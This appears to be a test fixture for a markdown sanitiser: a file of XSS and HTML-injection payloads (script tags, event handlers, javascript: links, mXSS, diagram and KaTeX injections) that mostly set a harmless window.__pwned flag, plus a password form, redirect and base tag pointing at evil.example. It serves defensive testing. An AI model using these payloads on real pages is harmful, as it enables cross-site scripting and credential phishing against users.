# Malicious document

<script>window.__pwned = 'script'</script>
<img src="x" onerror="window.__pwned = 'onerror'">
<svg onload="window.__pwned = 'svg'"><circle r="5"/></svg>
<a href="javascript:window.__pwned='js-link'">click me</a>
[md link](javascript:window.__pwned='md-link')
[data link](data:text/html,<script>window.__pwned='data'</script>)
<iframe src="https://example.com" srcdoc="<script>parent.__pwned='iframe'</script>"></iframe>
<object data="x.swf"></object><embed src="x.swf">
<form action="https://evil.example"><input name="password" type="password"><button>Go</button></form>
<style>body { display: none !important }</style>
<link rel="stylesheet" href="https://evil.example/x.css">
<meta http-equiv="refresh" content="0;url=https://evil.example">
<base href="https://evil.example/">
<div style="position:fixed;inset:0;z-index:99999;background:red">overlay</div>
<math><mtext><table><mglyph><style><img src=x onerror="window.__pwned='mxss'"></style></mglyph></table></mtext></math>
<details open ontoggle="window.__pwned='ontoggle'"><summary>s</summary>x</details>
<img name="cookie" id="ms-sidebar" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=">
<a href="#ok" target="_top">target</a>
<video src="v.mp4" autoplay onplay="window.__pwned='video'"></video>
<input type="text" value="phish" autofocus onfocus="window.__pwned='focus'">

```mermaid
graph TD
  A["<img src=x onerror=window.__pwned='mermaid'>"] --> B
  click A "javascript:window.__pwned='mermaid-click'"
```

```dot
digraph { a [URL="javascript:window.__pwned='dot'"]; a -> b }
```

$\href{javascript:window.__pwned='katex'}{katex}$
